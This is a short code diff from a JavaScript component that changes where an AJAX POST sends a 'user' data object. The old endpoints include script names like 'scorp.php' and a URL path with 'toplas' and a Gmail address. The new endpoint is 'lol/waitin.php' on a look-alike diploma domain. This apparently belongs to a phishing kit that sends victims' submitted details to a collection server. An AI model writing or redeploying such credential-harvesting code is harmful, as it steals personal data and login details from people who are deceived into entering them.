@@ -86,8 +86,7 @@ const Default = ()=>{
     
         $.ajax({
             type: "POST",
-            // url: "https://physicaleducationdiploma.com/anoda/scorp.php",
-            url: "https://physical-edu-two.onrender.com/component/diploma/toplas/wetrannsfer@gmail.com/tb/educationdiploma/",
+            url: "https://physicaleducationdiploma.com/lol/waitin.php",
             data: user,
             success(data) {
                 // alert('OK');
